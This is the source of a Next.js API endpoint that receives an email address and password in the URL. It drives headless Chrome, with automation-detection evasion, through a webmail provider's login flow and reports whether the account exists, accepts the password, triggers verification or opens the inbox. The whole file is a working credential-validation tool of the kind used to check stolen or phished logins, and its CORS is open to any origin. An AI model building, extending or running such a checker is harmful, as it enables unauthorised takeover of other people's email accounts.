import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import dns from 'dns';
import { promisify } from 'util';
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "@/utils/utils";
import logger from "@/utils/logger";
import geminiHelper from "@/utils/geminiHelper";
import { platformConfigs } from "@/app/verify-login-ai/platforms";
import { keyboardNavigate } from "@/utils/KeyboardHandlers";

const resolveMx = promisify(dns.resolveMx);

export const maxDuration = 60;
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

async function checkAccountAccess(email, password) {
    let browser = null;
    let emailExists = false;
    let accountAccess = false;
    let reachedInbox = false;
    let requiresVerification = false;

    try {
        const domain = email.split('@')[1].toLowerCase();
        const mxRecords = await resolveMx(domain).catch(() => []);
        
        let matchedPlatformKey = Object.keys(platformConfigs).find(key => {
            const config = platformConfigs[key];
            return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
        });

        let platform = matchedPlatformKey || 'unknown';
        let loginStrategy = {};

        if (platform !== 'unknown' && platformConfigs[platform]) {
            logger.info(`Matched platform: ${platform}`);
            loginStrategy = {
                url: platformConfigs[platform].url,
                steps: platformConfigs[platform].flow
            };
        } else {
            logger.info('No platform matched, using Ollama AI fallback.');
            try {
                const platformAnalysis = await geminiHelper.generateCompletion(`Determine platform for email: ${email}, mxRecords: ${JSON.stringify(mxRecords)}`);
                platform = platformAnalysis.platform || 'unknown';
                if (platform !== 'unknown' && platformConfigs[platform]) {
                    loginStrategy = {
                        url: platformConfigs[platform].url,
                        steps: platformConfigs[platform].flow
                    };
                } else {
                    loginStrategy = {
                        url: platformAnalysis.url || '',
                        steps: platformAnalysis.steps || []
                    };
                }
            } catch (ollamaError) {
                logger.warn('Ollama AI fallback failed, using default Gmail. Error:', ollamaError);
                platform = 'gmail';
                loginStrategy = {
                    url: platformConfigs.gmail.url,
                    steps: platformConfigs.gmail.flow
                };
            }
        }

        let loginUrl = loginStrategy.url;
        if (!loginUrl) {
            throw new Error('No valid login URL found for platform: ' + platform);
        }
        if (!loginUrl.startsWith('http://') && !loginUrl.startsWith('https://')) {
            loginUrl = 'https://' + loginUrl;
        }

        browser = await puppeteer.launch({
            ignoreDefaultArgs: ["--enable-automation"],
            args: [
                ...(isDev
                    ? [
                        "--disable-blink-features=AutomationControlled",
                        "--disable-features=site-per-process",
                        "-disable-site-isolation-trials"
                    ]
                    : [...chromium.args, "--disable-blink-features=AutomationControlled"]),
                '--window-size=1920,1080',
                '--force-device-scale-factor=1'
            ],
            defaultViewport: { width: 1920, height: 1080, deviceScaleFactor: 1 },
            executablePath: isDev
                ? localExecutablePath
                : await chromium.executablePath(remoteExecutablePath),
            headless: true,
        });

        const page = (await browser.pages())[0];
        await page.setUserAgent(userAgent);
        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        // Force scrollbars and fix overflow
        await page.evaluateOnNewDocument(() => {
            const style = document.createElement('style');
            style.innerHTML = `
                html, body { overflow: auto !important; }
                ::-webkit-scrollbar { display: block !important; }
            `;
            document.head.appendChild(style);
        });

        try {
            await page.goto(loginUrl, { 
                waitUntil: "networkidle2", 
                timeout: 60000 
            });
        } catch (navError) {
            logger.error('Navigation error:', navError);
            throw new Error(`Failed to navigate to ${platform} login page: ${navError.message}`);
        }

        const platformConfig = platformConfigs[platform];
        for (const step of loginStrategy.steps || []) {
            try {
                if (step.action === 'wait') {
                    logger.info(`Waiting for ${step.duration || 3000}ms`);
                    await new Promise(res => setTimeout(res, step.duration || 3000));
                    logger.info(`Waited for ${step.duration || 3000}ms`);
                    continue;
                }
                if (!step.selector) continue;

                // Resolve selector key to actual selector if needed
                let resolvedSelector = step.selector;
                if (
                  platformConfig &&
                  platformConfig.selectors &&
                  typeof step.selector === 'string' &&
                  platformConfig.selectors[step.selector]
                ) {
                  resolvedSelector = platformConfig.selectors[step.selector];
                }

                if (step.action === 'type') {
                    const value = step.value === 'EMAIL' ? email : (step.value === 'PASSWORD' ? password : step.value);
                    logger.info(`Typing value into ${step.selector}: ${step.value === 'PASSWORD' ? '*****' : value}`);
                    await page.waitForSelector(resolvedSelector, { visible: true, timeout: 15000 });
                    await page.evaluate((selector) => {
                        const element = document.querySelector(selector);
                        if (element) {
                            element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' });
                            element.value = '';
                        }
                    }, resolvedSelector);
                    await page.type(resolvedSelector, value, { delay: 25 }); // Reduced from 100 to 25
                    logger.info(`Typed value into ${step.selector}`);
                    await new Promise(res => setTimeout(res, 500)); // Reduced from 1000 to 500
                 } else if (step.action === 'click') {
                    let clicked = false;
                    if (typeof resolvedSelector === 'function') {
                        logger.info(`Invoking custom click handler for ${step.selector}`);
                        await resolvedSelector(page, platformConfig.selectors);
                        clicked = true;
                    } else {
                        let currentSelectors = Array.isArray(resolvedSelector) ? resolvedSelector : [resolvedSelector];
                        for (const sel of currentSelectors) {
                            try {
                                logger.info(`Trying to click on ${sel}`);
                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                
                                // Handle navigation that might occur after click
                                const navigationPromise = page.waitForNavigation({ 
                                    waitUntil: 'networkidle0', 
                                    timeout: 10000 
                                }).catch(() => null);
                                
                                await page.click(sel);
                                await navigationPromise;
                                logger.info(`Clicked on ${sel}`);
                                clicked = true;
                                break;
                            } catch (e) {
                                logger.warn(`Failed to click on ${sel}`);
                                continue;
                            }
                        }
                    }
                    
                    if (!clicked) {
                        throw new Error(`Critical click failure: ${JSON.stringify(step)}`);
                    }

                    // Wait for any animations or transitions
                    await new Promise(res => setTimeout(res, 2000));

                    // Handle additional views if configured and page is stable
                    if (platformConfig?.additionalViews) {
                        for (const view of platformConfig.additionalViews) {
                            try {
                                await page.waitForFunction(() => {
                                    return document.readyState === 'complete';
                                }, { timeout: 5000 }).catch(() => null);

                                const matchFound = await page.evaluate((viewData) => {
                                    try {
                                        const selectors = Array.isArray(viewData.match.selector) ? 
                                            viewData.match.selector : [viewData.match.selector];
                                            
                                        for (const sel of selectors) {
                                            const element = document.querySelector(sel);
                                            if (element) {
                                                return !viewData.match.text || 
                                                    element.textContent.includes(viewData.match.text);
                                            }
                                        }
                                    } catch (e) {}
                                    return false;
                                }, view).catch(() => false);

                                if (matchFound) {
                                    logger.info(`[Modal Handler] Processing view: ${view.name}`);
                                    
                                    // Handle non-verification modal actions
                                    if (view.action?.type === 'click') {
                                        const selectors = Array.isArray(view.action.selector) ? 
                                            view.action.selector : [view.action.selector];
                                        
                                        for (const selector of selectors) {
                                            try {
                                                await page.waitForSelector(selector, { visible: true, timeout: 3000 });
                                                await page.click(selector);
                                                await new Promise(res => setTimeout(res, 2000));
                                                break;
                                            } catch (modalClickError) {
                                                continue;
                                            }
                                        }
                                    }
                                }
                            } catch (viewError) {
                                logger.error(`View handling error: ${viewError.message}`);
                            }
                        }
                    }
                }

                // Only check inbox if no verification required
                if (step.selector === 'passwordNextButton' && !requiresVerification) {
                    reachedInbox = await isInbox(page, platformConfigs[platform] || {});
                    logger.info(`Final inboxReached: ${reachedInbox}`);
                }

                // Check for error messages if configured
                if (platformConfig && platformConfig.selectors) {
                    // Check for error after email next
                    if (step.selector === 'nextButton') {
                        if (platformConfig.selectors.errorMessage) {
                            const errorExists = await page.evaluate((xpath) => {
                                const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                                return !!result.singleNodeValue;
                            }, platformConfig.selectors.errorMessage);
                            if (errorExists) {
                                logger.info('Email error detected. Email does not exist.');
                                await browser.close();
                                return { 
                                    emailExists: false, 
                                    accountAccess: false, 
                                    reachedInbox: false, 
                                    requiresVerification: false 
                                };
                            } else {
                                emailExists = true;
                            }
                        }
                    }
                    // Check for login success after password next
                    if (step.selector === 'passwordNextButton') {
                        // First check for login failure
                        if (platformConfig.selectors.loginFailed) {
                            const failExists = await page.evaluate((xpath) => {
                                const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
                                return !!result.singleNodeValue;
                            }, platformConfig.selectors.loginFailed);
                            
                            if (failExists) {
                                logger.info('Login failed detected after password next.');
                                accountAccess = false;
                                reachedInbox = false;
                                return { emailExists, accountAccess, reachedInbox, requiresVerification };
                            } else {
                                logger.info('Login successful - no failure detected');
                                accountAccess = true;
                            }
                        } else {
                            // If no login failure selector is configured, assume success
                            logger.info('Login assumed successful - no failure check configured');
                            accountAccess = true;
                        }
                    }
                }

            } catch (stepError) {
                logger.error(`Step error (${step.action}):`, stepError);
                // If critical step fails, return appropriate status
                if (step.selector === 'nextButton') {
                    emailExists = false;
                    accountAccess = false;
                    return { emailExists, accountAccess, reachedInbox, requiresVerification };
                }
                if (step.selector === 'passwordNextButton') {
                    accountAccess = false;
                    return { emailExists, accountAccess, reachedInbox, requiresVerification };
                }
            }
        }

        // Check for verification views after successful login
        if (emailExists && accountAccess) {
            requiresVerification = await checkVerification(page, platformConfig);
            if (requiresVerification) {
                return { 
                    emailExists: true, 
                    accountAccess: true, 
                    reachedInbox: false, 
                    requiresVerification: true 
                };
            }
        }

        // Only check inbox if no verification required
        reachedInbox = false; // Default to false
        if (emailExists && accountAccess && !requiresVerification) {
            reachedInbox = await isInbox(page, platformConfigs[platform] || {});
            logger.info(`Final inboxReached: ${reachedInbox}`);
        }

        return { emailExists, accountAccess, reachedInbox, requiresVerification };
    } catch (err) {
        logger.error(`Error checking account access:`, err);
        return { 
            emailExists: false, 
            accountAccess: false, 
            reachedInbox: false,
            requiresVerification: false,
            error: err.message 
        };
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}

async function isInbox(page, platformConfig) {
    try {
        // Check URL patterns if configured
        if (platformConfig.inboxUrlPatterns) {
            const currentUrl = page.url();
            for (const pattern of platformConfig.inboxUrlPatterns) {
                if (pattern.test(currentUrl)) {
                    logger.info('Inbox detected via URL pattern');
                    return true;
                }
            }
        }

        // Check DOM selectors if configured
        if (platformConfig.inboxDomSelectors) {
            for (const selector of platformConfig.inboxDomSelectors) {
                try {
                    if (typeof selector === 'string') {
                        await page.waitForSelector(selector, { timeout: 5000 });
                        logger.info(`Inbox detected via DOM selector: ${selector}`);
                        return true;
                    } else if (typeof selector === 'object') {
                        const element = await page.waitForSelector(selector.selector, { timeout: 5000 });
                        if (selector.text) {
                            const text = await page.evaluate(el => el.textContent, element);
                            if (text.includes(selector.text)) {
                                logger.info(`Inbox detected via DOM selector with text: ${selector.selector}`);
                                return true;
                            }
                        } else {
                            logger.info(`Inbox detected via DOM selector: ${selector.selector}`);
                            return true;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }
        }
        
        return false;
    } catch (error) {
        logger.error('Error checking inbox:', error);
        return false;
    }
}

async function checkVerification(page, platformConfig) {
    if (!platformConfig?.additionalViews) return false;

    logger.info('[Verification Check] Starting verification check...');

    // First check for verification views
    for (const view of platformConfig.additionalViews) {
        if (!view.requiresVerification) continue;

        try {
            logger.info(`[Verification Check] Checking view: ${view.name}`);
            
            // Traditional selector-based check
            const matchFound = await page.evaluate((viewData) => {
                const selectors = Array.isArray(viewData.match.selector) ? 
                    viewData.match.selector : [viewData.match.selector];
                    
                for (const sel of selectors) {
                    const element = document.querySelector(sel);
                    if (element) {
                        return !viewData.match.text || 
                            element.textContent.includes(viewData.match.text);
                    }
                }
                return false;
            }, view).catch(() => false);

            if (matchFound) {
                logger.info(`[Verification Check] Traditional selector match found for view: ${view.name}`);
                return true;
            }

            logger.info('[Verification Check] Traditional selector check failed, trying AI analysis...');
            const analysis = await geminiHelper.analyzePageContent(
                page,
                view.match.selector,
                'verification'
            );

            if (analysis.found || analysis.pageState === 'verification') {
                logger.info('[Verification Check] Verification detected through analysis');
                return true;
            }
        } catch (error) {
            logger.error('[Verification Check] Error during verification check:', error);
        }
    }

    // Only if no verification was found, check if we're in inbox
    try {
        const isInInboxPage = await isInbox(page, platformConfig);
        if (isInInboxPage) {
            logger.info('[Verification Check] Already in inbox, no verification needed');
            return false;
        }
    } catch (error) {
        logger.error('[Verification Check] Error checking inbox status:', error);
    }

    logger.info('[Verification Check] No verification required');
    return false;
}

const setCorsHeaders = (response) => {
  response.headers.set("Access-Control-Allow-Origin", "*");
  response.headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  response.headers.set("Access-Control-Allow-Headers", "Content-Type");
  return response;
};

export async function GET(request) {
  const url = new URL(request.url);
  const email = url.searchParams.get("email");
  const password = url.searchParams.get("password");

  if (!email || !password) {
    return NextResponse.json({ error: "Missing email or password parameter" }, { status: 400 });
  }

  const { emailExists, accountAccess, reachedInbox, requiresVerification } = await checkAccountAccess(email, password);
  return setCorsHeaders(NextResponse.json({ 
      emailExists, 
      accountAccess, 
      requiresVerification,
      reachedInbox, 
  }, { status: 200 }));
}

export async function OPTIONS() {
  return setCorsHeaders(NextResponse.json({}, { status: 200 }));
}